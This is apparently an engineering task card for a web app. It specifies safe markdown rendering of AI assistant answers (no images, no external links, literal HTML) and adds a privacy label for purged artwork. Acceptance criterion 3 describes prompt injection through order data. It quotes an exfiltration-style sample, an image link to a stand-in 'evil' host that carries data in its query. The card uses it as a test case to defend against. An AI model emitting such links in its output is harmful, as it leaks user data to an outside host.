# T-29-3: Assistant answers render as safe formatted text

| Field | Value |
|---|---|
| Wave | 29 |
| Scope ref | `always-in-scope: bug` in `product/scope.md#mvp-in` item 13 (AI business assistant); spec `specs/assistant-business-analyst.md` |
| Spec | `specs/assistant-business-analyst.md`; backlog B-270 (owner demo 2026-10-02) |
| Owner | web-engineer |
| Reviewer | reviewer (opus) |
| Co-reviewers | security-reviewer (sonnet): rendering of untrusted model output |
| Risk flags | ui, untrusted AI output |
| Model | sonnet |

## Owned paths (edit)
- `invai-web/src/routes/_app/assistant.tsx` and the components it renders the answer with
- `invai-web/src/content/markdown.ts`, `markdown-view.tsx` and their tests (add an option; help and legal rendering must not change)
- `invai-web/src/i18n/en.ts`, `src/i18n/es.ts`, `scripts/i18n-es.json`: the new key `artworkStatus.purged` (T-29-5 contract; en "Removed for privacy", es "Eliminado por privacidad"; shown by `order-detail.tsx:347` and `personalization.index.tsx:144,217`), plus any string this card needs

## Read-only paths
- `invai-backend/**` (no prompt change in this card), `invai-contracts/**`, `invai-ui/**`

## Depends on
- T-29-5 committed (for AC 6 only); the markdown part can start at once

## Interfaces promised
- `parseMarkdown(text, { source: "ai" })` (or an equivalent option name you pick): the AI mode drops images and turns links into plain text unless the href is an in-app path starting with a single `/` (no `//`, no backslash); the content mode (help, legal) stays exactly as today. AI mode calls `parseBlocks` directly (no frontmatter stripping, so an answer starting with `---` is not swallowed) and keeps single line breaks inside a paragraph (today's plain answers render with `whitespace-pre-wrap`, `assistant.tsx:291`). The screen is custom state, not assistant-ui message parts.

## Acceptance criteria
1. Given the assistant answers with `**bold**`, `### heading`, `- list`, `1. list` and a pipe table (the shape OpenAI produced in B-270), when the answer shows in the chat, then it reads as bold text, a heading, lists and a table, with no `**`, `###` or `|` characters left as literal markers. This holds for streamed answers mid-stream too (a half-finished `**` doesn't break the layout; it may show as text until closed).
2. Plain-text answers (the mock and Anthropic answers today) look the same as before.
3. **Safety.** Model output can carry text from order data (prompt injection). In AI mode: no `<img>` is ever rendered (an `![x](https://evil/?q=data)` shows as text or nothing, and makes no request), no external link is clickable, raw HTML stays literal text, no `dangerouslySetInnerHTML`. Unit tests cover each case.
4. Help and legal pages render exactly as before (existing `markdown.test.ts` passes unchanged).
5. Headings inside a chat bubble use a modest size (not page-level `h1`), tables scroll horizontally on 390 px instead of overflowing the bubble.
6. With the T-29-5 contract, an order or personalization screen showing a purged artwork shows "Removed for privacy" (es "Eliminado por privacidad"), never the raw word `purged` (unit test on the label lookup).

## Verification
- `pnpm typecheck && pnpm lint && pnpm test && pnpm build` in `invai-web`.
- Exercise for real: a Vitest/Testing Library render of the answer component with the B-270 sample answer and the injection samples, asserting the DOM (no `img`, no `a[href^=http]`, `strong`/`table` present). A headless Playwright check of the assistant screen on the :5173 slot with the mock provider, asserting the answer renders and no console error (no screenshots read by agents, decision 0024). Record every PID you start and stop it.

## Out of scope
- Any backend prompt change (if you think the prompt should also ask for plain text, say so in the report; that is an ai-engineer card).
- Other chat features.

## Budget
- Escalate to the tech lead if blocked for more than about 30 minutes of work, or if the card turns out bigger than planned.
